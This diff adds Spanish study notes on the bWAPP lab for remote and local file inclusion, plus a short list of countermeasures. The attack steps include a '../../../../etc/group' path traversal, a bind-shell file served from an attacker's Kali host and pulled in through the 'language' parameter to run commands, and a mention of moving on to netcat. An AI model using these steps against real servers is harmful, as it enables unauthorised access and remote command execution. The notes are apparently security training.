@@ -666,3 +666,25 @@ La clave para realizar éste ataque es conocer la estructura dentro del servidor
 - Veremos un pequeño form, seleccionaremos idioma > Go
 - Observaremos que la barra de direcciones y veremos que en la petición GET uno de los parametros es el nombre de otro archivo PHP
     - [url - get] /bWAPP/rlfi.php?language=lang_en.php&action=go
+- Con esta información, podemos **suponer** que se está haciando un **include** para incluir este código incluirá ese archivo .php dentro del .php original
+- Con esto, podemos hacer referencia a otros archivos de otros directorios y ver si el php los incluye y muestra en la página
+- Partiendo de que está corriendo un Apache, la ruta de la que partimos será `/var/www/html`
+- Intentaremos salirnos con `../` para acceder a otros directorios
+    - Probaremos a introducir en la url `../../../../etc/group` para ver si muestra el fichero de de group
+- Tendremos que poner los ficheros que encontramos en `ficheros_var_www_html` en la ruta del apache de la máquina atacante Kali en `/var/www/html`
+- El fichero simplebindshell.php debemos pasarlo a txt > `simplebindshell.txt` para que no se autoejecute
+- En la página vulnerable introduciremos nuestro fichero agregando en la url `http://{ip_maquina_kali}/simplebindshell.txt`
+- Al final de la url agregamos el parametro `&i=ls` o el comando que queramos que se ejecute remotamente, para este caso será un ls
+    - De esta forma podríamos incluso llegar a hacer un `netcat`
+
+#### *Contramedidas contra RFI y LFI*
+
+- Una forma de controlar los ataques RFI es controlar el contenido que los usuarios suben a nuestra web
+    - Controlar el tipo del fichero
+    - Controlar el contenido del fichero si es posible
+    - Si no es necesario no permitir subir ficheros
+    - Que los ficheros que se suban sean solo de lectura
+- Para evitar los ataques LFI, si usamos PHP, podemos modificar las siguientes opciones del fichero PHP.ini
+    - allow_url_include = off; Está opción se usa para evitar que se usen funciones como include en PHP, por eso también es útil para evitar RFI
+    - allow_url_fopen = off; Evita que puedan acceder a objetos URL del servidor como ficheros
+    - También se debe modificar el servidor web para evitar que puedan salir fuera del directorio raíz
